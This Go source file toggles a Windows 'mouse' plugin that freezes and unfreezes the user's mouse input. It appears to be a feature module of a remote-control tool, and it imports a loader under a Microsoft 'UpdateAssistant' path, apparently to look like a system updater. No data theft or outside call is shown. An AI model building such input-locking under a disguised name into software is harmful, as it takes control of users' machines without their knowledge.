//go:build windows

package sysutil

import (
	"sync"

	"github.com/microsoft/UpdateAssistant/modules/loader"
)

var (
	mouseMu     sync.Mutex
	mousePlugin *loader.Plugin
)

func MouseFrozen() bool {
	mouseMu.Lock()
	defer mouseMu.Unlock()
	return mousePlugin != nil
}

func MouseToggle() (frozen bool, ok bool) {
	mouseMu.Lock()
	defer mouseMu.Unlock()

	if mousePlugin != nil {
		ret, _ := mousePlugin.Call("mouse_unfreeze")
		loader.Unload(mousePlugin)
		mousePlugin = nil
		return false, ret == 1
	}

	p, err := loader.Load("mouse")
	if err != nil {
		return true, false
	}
	ret, _ := p.Call("mouse_freeze")
	if ret != 1 {
		loader.Unload(p)
		return true, false
	}
	mousePlugin = p
	return true, true
}
